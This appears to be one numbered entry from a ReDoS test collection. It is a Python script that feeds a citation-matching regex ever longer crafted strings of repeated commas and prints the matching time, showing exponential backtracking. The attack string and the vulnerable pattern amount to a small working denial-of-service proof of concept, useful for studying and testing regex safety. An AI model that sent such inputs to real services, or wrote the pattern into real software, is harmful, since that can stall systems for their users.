# 3031
# ([0-9]* {0,2}[A-Z]{1}\w+[,.;:]? {0,4}[xvilcXVILC\d]+[.,;:]( {0,2}[\d-,]{1,7})+)([,.;:] {0,4}[xvilcXVILC]*[.,;:]( {0,2}[\d-,]{1,7})+)*
# EXPONENT
# nums:4
# EXPONENT AttackString:"A1x.1"+",,"*16+"!1 __EOA(iv)"

import re
from time import perf_counter

regex = """([0-9]* {0,2}[A-Z]{1}\w+[,.;:]? {0,4}[xvilcXVILC\d]+[.,;:]( {0,2}[\d-,]{1,7})+)([,.;:] {0,4}[xvilcXVILC]*[.,;:]( {0,2}[\d-,]{1,7})+)*"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "A1x.1" + ",," * i * 1 + "!1 __EOA(iv)"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")